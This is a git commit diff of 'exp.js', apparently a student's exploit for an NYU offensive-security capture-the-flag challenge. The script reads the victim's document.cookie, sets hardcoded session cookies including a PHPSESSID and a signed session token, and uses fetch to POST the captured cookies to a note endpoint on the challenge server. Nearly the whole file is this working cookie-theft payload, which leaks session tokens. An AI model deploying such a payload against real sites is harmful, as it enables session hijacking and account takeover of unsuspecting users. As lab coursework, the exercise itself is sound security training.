443613993a6c1b2b108d7bdaea2fd9007883d408
David Brosnan <dbrosn626@gmail.com>
2023-01-29 12:35:37 -0500

    Update exp.js

--- exp.js
+++ exp.js
@@ -1,7 +1,9 @@
+let x = document.cookie
+document.cookie = "CHALBROKER_USER_ID=dmb9589; TESTCOOKIE=1234; PHPSESSID=n9q6t2sofgli4bslcbha4ev6c5; session=.eJwtzrERwzAIAMBdqF0gJCHhZXyA4JzWjqtcdk-Tn-A_cOQV9wn7-3pig-O1YAdFHbHmUNeOK5WqNEaJrFQ0ZsEUFDaLGracwkr3FBZXVZkWo0xKRSq5InVZFOXO4dwoRxVvblTqyNorUjREG414Eis7demwwXPH9c-Yw_cHjzYw2g.Y9aiRQ.i0lT2QzfsX0w02pClwj0r3mjqV4"
 fetch('http://offsec-chalbroker.osiris.cyber.nyu.edu:12345/note/new', {
 credentials:'include',
-headers: {"Content-Type": "application/x-www-form-urlencoded", Cookie: "CHALBROKER_USER_ID=dmb9589; TESTCOOKIE=1234; PHPSESSID=n9q6t2sofgli4bslcbha4ev6c5; session=.eJwtzrERwzAIAMBdqF0gJCHhZXyA4JzWjqtcdk-Tn-A_cOQV9wn7-3pig-O1YAdFHbHmUNeOK5WqNEaJrFQ0ZsEUFDaLGracwkr3FBZXVZkWo0xKRSq5InVZFOXO4dwoRxVvblTqyNorUjREG414Eis7demwwXPH9c-Yw_cHjzYw2g.Y9aiRQ.i0lT2QzfsX0w02pClwj0r3mjqV4"},
+headers: {"Content-Type": "application/x-www-form-urlencoded"},
 method: 'POST',
 mode: 'no-cors',
-body: "title=exp123&content=" + document.cookie + "&submit=save"
+body: "title=exp456&content=" + x + "&submit=save"
 });
